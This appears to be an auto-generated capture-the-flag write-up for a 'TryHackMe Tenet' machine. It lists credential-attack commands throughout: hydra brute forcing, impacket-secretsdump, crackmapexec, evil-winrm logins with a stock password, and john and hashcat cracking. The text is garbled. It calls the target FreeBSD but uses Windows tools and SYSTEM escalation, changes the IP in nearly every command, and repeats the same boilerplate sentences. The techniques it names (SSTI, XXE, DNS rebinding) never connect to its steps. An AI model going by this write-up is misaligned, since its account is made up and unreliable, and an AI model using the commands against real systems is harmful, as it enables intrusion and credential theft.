---
TitleSEO: "TryHackMe — Tenet (Insane FreeBSD) | ZureFX"
TitlePost: "TryHackMe — Tenet (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Tenet. Pass the Hash and XXE to achieve insane compromise on FreeBSD."
Keywords: "insane, offsec, windows, forensics, ctf, linux"
URL: "https://zurefx.github.io/writeups/htb-tenet-833.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-833/"
Date: "2025-03-18"
Tags: "Insane, OffSec, Windows, Forensics, CTF, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-833"
Permalink: "/writeups/htb-tenet-833.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Tenet** is rated **Insane** on TryHackMe. It runs **FreeBSD** and the IP address during this analysis was `10.15.95.103`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p636,1433,3268 10.106.100.180 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.116.178.214 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.46.58
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.115.165.35 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.18.241.63 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.20.134.167 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
evil-winrm -i 10.107.80.57 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p443,80,21 10.100.81.198 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **DNS Rebinding**.

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.129.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
gobuster dir -u http://10.17.225.116/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
evil-winrm -i 10.29.144.153 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1433,80,8443 10.110.223.103 -oN scan.txt
nmap -sCV -p445,22,389 10.18.175.47 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `nmap`
- `psexec`
- `kerbrute`
- `secretsdump`
- `chisel`

### Key Takeaways

- Pass the Hash
- XXE
- DNS Rebinding
- Unconstrained Delegation
